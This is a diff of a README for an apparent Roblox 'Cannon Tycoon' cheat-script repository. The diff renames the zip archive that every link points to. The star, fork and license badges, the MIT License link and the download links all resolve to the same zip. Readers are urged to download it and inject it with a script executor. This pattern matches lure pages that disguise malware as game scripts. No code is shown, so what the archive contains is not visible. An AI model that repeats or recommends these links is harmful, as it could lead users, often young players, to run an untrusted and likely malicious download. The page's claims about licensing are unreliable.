@@ -1,9 +1,9 @@
 # 🎇 Cannon Tycoon Roblox Script
 
-[![Stars](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)]
-[![Forks](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)]
-[![License](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)
-[![Roblox](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)]
+[![Stars](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)]
+[![Forks](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)]
+[![License](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)
+[![Roblox](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)]
 
 Welcome to the ultimate launchpad for those seeking to enhance their Cannon Tycoon adventures on Roblox! Enter a world where strategic automation meets seamless user experience. This robust repository offers a suite of adaptable scripts meticulously crafted for Cannon Tycoon. Unlock a new perspective: boost efficiency, streamline repetitive tasks, and enjoy immersive gameplay with a script driven by AI insights and community-powered innovation.
 
@@ -77,8 +77,8 @@ Welcome to the ultimate launchpad for those seeking to enhance their Cannon Tyco
 
 1. **Download the latest release:**
    
-   - [![Download](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)
-   - https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip
+   - [![Download](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)
+   - https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip
 
 2. **Inject using your preferred Roblox script executor.**
 3. **Follow the on-screen instructions to configure AI provider and select your language.**
@@ -115,8 +115,8 @@ We believe in collective innovation! Suggest features, report issues via the Iss
 
 Snag the fresh, evolved Cannon Tycoon script below. Your next level of automation is within reach!
 
-- [![Download](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip)
-- https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip
+- [![Download](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip)
+- https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip
 
 > _For detailed changelogs, see the [Releases](../../releases) page._
 
@@ -124,7 +124,7 @@ Snag the fresh, evolved Cannon Tycoon script below. Your next level of automatio
 
 ## 📜 License
 
-This repository and all contributions are licensed under the [MIT License](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/cannon-tycoon-roblox-scriptery-v3.5.zip) (c) 2025. Please refer to the LICENSE file for additional permissions and limitations.
+This repository and all contributions are licensed under the [MIT License](https://raw.githubusercontent.com/slayerlux/cannon-tycoon-roblox-scriptery/branch/postsplenial/roblox-scriptery-tycoon-cannon-v1.9.zip) (c) 2025. Please refer to the LICENSE file for additional permissions and limitations.
 
 ---
 
